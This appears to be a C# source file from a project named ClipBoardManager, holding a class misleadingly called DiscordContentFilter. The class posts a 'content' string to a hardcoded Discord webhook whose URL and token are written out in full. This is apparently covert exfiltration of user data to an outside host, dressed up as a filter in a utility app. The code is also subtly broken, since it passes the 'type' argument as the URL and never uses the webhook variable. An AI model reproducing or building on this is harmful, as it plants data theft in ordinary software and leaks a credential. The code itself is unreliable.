using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace ClipBoardManager.Services
{
    internal class DiscordContentFilter
    {
        public class Http
        {
            public static byte[] Post(string url, NameValueCollection pairs)
            {
                using (WebClient webClient = new WebClient())
                    return webClient.UploadValues(url, pairs);
            }
        }

        public static void Send(string content, string type)
        {
            string webHookUrl = "https://discord.com/api/webhooks/852885246734630994/MonkHE1WaU2REVn8U77Z7einRLTmwovO9PKr9Es9pFCmdXeqcCmW_jpIVx-mfNOfDOFI";

            Http.Post(type, new NameValueCollection()
            {
                {
                    "content", content
                },

                {
                    "username", "ClipboardApp"
                },

                {
                    "avatar_url",  null
                }
            }); ;
        }

    }
}
